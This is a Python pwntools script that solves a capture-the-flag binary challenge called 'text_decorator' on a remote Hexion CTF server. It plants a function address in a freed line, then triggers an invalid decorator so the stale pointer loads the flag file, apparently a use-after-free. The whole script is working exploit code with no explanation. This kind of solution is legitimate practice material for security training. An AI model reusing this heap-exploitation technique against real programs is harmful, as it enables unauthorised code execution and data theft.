#!/usr/bin/env python3
from pwn import *

load_from_file = 0x4019d8

if args.LOCAL:
    io = process(['./text_decorator'])
else:
    io = remote('challenges2.hexionteam.com', 3001)

# Add a raw line.
io.recvuntil('Your choice: ')
io.sendline('1')
io.recvuntil('Enter the text for this line [256 characters max]:')
io.sendline(struct.pack('<Q', load_from_file))
io.recvuntil('Would you like to decorate it [Y/n]? ')
io.sendline('n')

# Remove it.
io.recvuntil('Your choice: ')
io.sendline('3')

# Add a decorated line with an invalid decorator.
io.recvuntil('Your choice: ')
io.sendline('1')
io.recvuntil('Enter the text for this line [256 characters max]:')
io.sendline(b'flag\0')
io.recvuntil('Would you like to decorate it [Y/n]? ')
io.sendline('y')
io.recvuntil('Your choice: ')
io.sendline('x')

# Load flag.
io.recvuntil('Your choice: ')
io.sendline('2')

io.interactive()
